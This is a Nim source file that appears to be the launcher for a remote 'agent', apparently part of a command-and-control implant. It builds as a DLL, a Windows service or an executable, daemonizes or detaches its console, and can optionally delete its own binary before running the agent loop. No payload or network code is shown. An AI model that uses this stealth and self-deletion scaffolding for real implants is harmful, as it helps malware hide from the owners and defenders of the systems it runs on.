when defined(dll):
  # DLL build - use DLL entry points
  import dll_entry
elif defined(service):
  # Windows Service build - use service entry points
  import service_entry
  
  # Entry point for service - call StartServiceDispatcher
  when isMainModule:
    StartServiceDispatcher()
else:
  # Executable build - use standard main entry point
  import agent

  # Conditional imports for Windows-only features
  when defined(windows):
    when defined(selfDelete):
      import utils/self_delete
    import winim/lean

  when defined(linux):
    import posix

  proc daemonize(): bool =
    when defined(windows):
      result = FreeConsole() != 0
    else:
      # Unix/Linux fork-based daemonization
      var pid = fork()
      if pid < 0:
        return false
      elif pid > 0:
        quit(0)
      
      discard setsid()
      
      # Second fork
      pid = fork()
      if pid < 0:
        return false
      elif pid > 0:
        quit(0)
      
      discard chdir("/")
      
      # Close standard file descriptors
      for fd in 0..2:
        discard close(fd.cint)
      
      result = true

  # Main entry point
  proc main() =
    # Daemonize if compile flag is set
    when defined(daemonize):
      if daemonize():
        runAgent()
        return
    
    # Handle self-delete BEFORE main execution if enabled (if not daemonized)
    when defined(windows):
      when defined(selfDelete):
        selfDelete()
    
    # Call the shared agent main loop
    runAgent()
  
  when isMainModule:
    main()
